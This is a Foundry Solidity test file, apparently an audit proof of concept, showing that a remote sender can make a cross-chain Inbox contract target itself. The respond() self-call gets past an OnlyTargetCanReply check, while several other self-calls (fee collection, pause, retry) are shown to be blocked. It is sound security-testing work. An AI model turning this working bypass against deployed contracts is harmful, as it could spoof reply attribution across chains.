// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Inbox} from "../../contracts/Inbox.sol";
import {InboxBase} from "../../contracts/InboxBase.sol";
import {FeeManager} from "../../contracts/fee/FeeManager.sol";
import {MpcAbiReEncode} from "../../contracts/MpcAbiReEncode.sol";
import {PriceOracle} from "../../contracts/fee/PriceOracle.sol";
import {LibFeeStorage} from "../../contracts/fee/LibFeeStorage.sol";
import {FeeManagerStubBase} from "../../contracts/fee/FeeManagerStubBase.sol";
import "@coti-io/coti-contracts/contracts/pod/IInbox.sol";
import "@coti-io/coti-contracts/contracts/pod/IInboxMiner.sol";

/// PoC: a remote sender targets the destination Inbox itself (targetContract == address(inbox)).
/// Run: FOUNDRY_TEST=test/poc forge test --match-path "test/poc/*" -vv
/// Shows ingest accepts a self-target, the respond() self-call bypasses OnlyTargetCanReply, and
/// that every other self-call (send, collectFees, pause, retry) is already blocked.
contract SelfTargetPoC is Test {
    uint256 constant SRC = 1000;
    uint256 constant DST = 1001;
    uint256 constant GP = 1 gwei;

    address owner = address(this);
    address attacker = makeAddr("attacker");
    Inbox source;
    Inbox target;

    function _fee() internal pure returns (FeeManagerStubBase.FeeConfig memory f) {
        f = FeeManagerStubBase.FeeConfig({
            constantFee: 0, gasPerByte: 800, callbackExecutionGas: 100_000, errorLength: 256,
            bufferRatioX10000: 5000, maxMethodCallBytes: 8192, maxExecutionGas: 5_000_000,
            gasPriceMul: 1, gasPriceDiv: 1
        });
    }

    function _mk(uint256 id, PriceOracle oracle) internal returns (Inbox c) {
        c = new Inbox();
        c.init(owner, id, address(new MpcAbiReEncode()), address(new FeeManager()));
        c.updateMinFeeConfigs(_fee(), _fee());
        c.addMiner(owner);
        c.setPriceOracle(address(oracle));
        c.setGasPriceBounds(0, GP, GP);
    }

    function setUp() public {
        PriceOracle oracle = new PriceOracle(owner);
        oracle.setInboxTokens(address(0x1111), address(0xC071));
        oracle.setLocalTokenPriceUSD(1e18);
        oracle.setRemoteTokenPriceUSD(1e18);
        source = _mk(SRC, oracle);
        target = _mk(DST, oracle);
        vm.deal(attacker, 100 ether);
        vm.txGasPrice(GP);
    }

    function _mc(bytes memory data) internal pure returns (IInbox.MpcMethodCall memory m) {
        m = IInbox.MpcMethodCall({selector: bytes4(0), data: data, datatypes: new bytes8[](0), datalens: new bytes32[](0)});
    }

    function _toMined(IInbox.Request memory r) internal pure returns (IInboxMiner.MinedRequest memory m) {
        m = IInboxMiner.MinedRequest({
            requestId: r.requestId, sourceContract: r.originalSender, targetContract: r.targetContract,
            methodCall: r.methodCall, callbackSelector: r.callbackSelector, errorSelector: r.errorSelector,
            isTwoWay: r.isTwoWay, sourceRequestId: r.sourceRequestId, targetFee: r.targetFee, callerFee: r.callerFee
        });
    }

    /// attacker on SRC sends a message whose remote target is the DST Inbox; miner ingests it on DST.
    function _sendAndMine(bytes memory data, bool twoWay) internal returns (IInboxMiner.MinedRequest memory m, bool ok, bytes memory why) {
        uint256 tFee = 4_000_000 * GP;
        vm.startPrank(attacker, attacker);
        if (twoWay) {
            uint256 cFee = 1_000_000 * GP;
            source.sendTwoWayMessage{value: tFee + cFee}(DST, address(target), _mc(data), 0x11111111, 0x22222222, cFee);
        } else {
            source.sendOneWayMessage{value: tFee}(DST, address(target), _mc(data), bytes4(0));
        }
        vm.stopPrank();
        uint256 len = source.getRequestsLen(DST);
        IInbox.Request[] memory reqs = source.getRequests(DST, len - 1, 1);
        m = _toMined(reqs[0]);
        IInboxMiner.MinedRequest[] memory batch = new IInboxMiner.MinedRequest[](1);
        batch[0] = m;
        (ok, why) = address(target).call(abi.encodeCall(IInboxMiner.batchProcessRequests, (SRC, batch)));
    }

    function _err(bytes32 id) internal view returns (uint64 code, bytes memory msg_) {
        (, code, msg_) = target.errors(id);
    }

    function test_A_selfTarget_respond_passes_OnlyTargetCanReply() public {
        bytes memory data = abi.encodeCall(IInbox.respond, (hex"deadbeef"));
        (IInboxMiner.MinedRequest memory m, bool ok, bytes memory why) = _sendAndMine(data, true);
        console2.log("ingest ok:", ok);
        if (!ok) console2.logBytes(why);
        assertTrue(ok, "ingest accepted a self-targeted request");
        (uint64 code,) = _err(m.requestId);
        console2.log("errorCode after execution:", code);
        uint256 outLen = target.getRequestsLen(SRC);
        console2.log("DST outbound queue to SRC:", outLen);
        assertEq(code, 0, "self-call respond() executed without error");
        assertEq(outLen, 1, "Inbox produced a reply to its own request");
        IInbox.Request memory back = target.getRequests(SRC, 0, 1)[0];
        console2.log("reply.callerContract  :", back.callerContract);
        console2.log("reply.originalSender  :", back.originalSender);
        console2.log("DST Inbox address     :", address(target));
        console2.log("reply.targetContract  :", back.targetContract);
        console2.logBytes(back.methodCall.data);
        assertEq(back.callerContract, address(target), "reply is attributed to the Inbox itself");
        assertEq(back.originalSender, address(target));
        assertEq(target.getInboxResponse(m.requestId), hex"deadbeef");
    }

    function test_B_selfTarget_sendOneWayMessage_fails_valueIsZero() public {
        bytes memory data = abi.encodeCall(IInbox.sendOneWayMessage, (SRC, attacker, _mc(""), bytes4(0)));
        (IInboxMiner.MinedRequest memory m, bool ok,) = _sendAndMine(data, false);
        assertTrue(ok);
        (uint64 code, bytes memory msg_) = _err(m.requestId);
        console2.log("errorCode:", code);
        console2.logBytes(msg_);
        assertEq(code, 1, "execution failed");
        assertEq(bytes4(msg_), FeeManager.TotalFeeTooLow.selector);
        assertEq(target.getRequestsLen(SRC), 0, "no outbound message minted for free");
    }

    function test_C_selfTarget_collectFees_fails_onlyOwner() public {
        bytes memory data = abi.encodeCall(target.collectFees, (payable(attacker)));
        uint256 before = address(target).balance;
        (IInboxMiner.MinedRequest memory m, bool ok,) = _sendAndMine(data, false);
        assertTrue(ok);
        (uint64 code, bytes memory msg_) = _err(m.requestId);
        console2.log("errorCode:", code); console2.logBytes(msg_);
        assertEq(code, 1);
        assertEq(address(target).balance, before, "no fee drain");
    }

    function test_D_selfTarget_pause_fails_onlyOwner() public {
        bytes memory data = abi.encodeCall(target.setMessageProcessingPaused, (true));
        (IInboxMiner.MinedRequest memory m, bool ok,) = _sendAndMine(data, false);
        assertTrue(ok);
        (uint64 code,) = _err(m.requestId);
        assertEq(code, 1);
        assertFalse(target.messageProcessingPaused());
    }

    function test_E_selfTarget_retryFailedRequest_blocked_by_nonReentrant() public {
        bytes memory data = abi.encodeCall(target.retryFailedRequest, (bytes32(uint256(1))));
        (IInboxMiner.MinedRequest memory m, bool ok,) = _sendAndMine(data, false);
        assertTrue(ok);
        (uint64 code, bytes memory msg_) = _err(m.requestId);
        console2.log("errorCode:", code); console2.logBytes(msg_);
        assertEq(code, 1);
    }

    /// estimate path: does the miner's preflight flag a self-target? (it should mirror ingest)
    function test_F_estimate_does_not_flag_selfTarget() public {
        bytes memory data = abi.encodeCall(IInbox.respond, (hex"deadbeef"));
        uint256 tFee = 4_000_000 * GP;
        vm.startPrank(attacker, attacker);
        uint256 cFee = 1_000_000 * GP;
        source.sendTwoWayMessage{value: tFee + cFee}(DST, address(target), _mc(data), 0x11111111, 0x22222222, cFee);
        vm.stopPrank();
        IInboxMiner.MinedRequest memory m = _toMined(source.getRequests(DST, 0, 1)[0]);
        (bool ok, bytes memory why) = address(target).call(abi.encodeCall(IInboxMiner.estimateExecutionGasForMiner, (SRC, m, 0)));
        console2.log("estimate call ok (always-revert design):", ok);
        console2.logBytes4(bytes4(why));
        // estimate reverts by design with a gas-report error; a self-target is NOT flagged as InvalidTargetContract
        assertTrue(bytes4(why) != InboxBase.InvalidTargetContract.selector);
    }
}
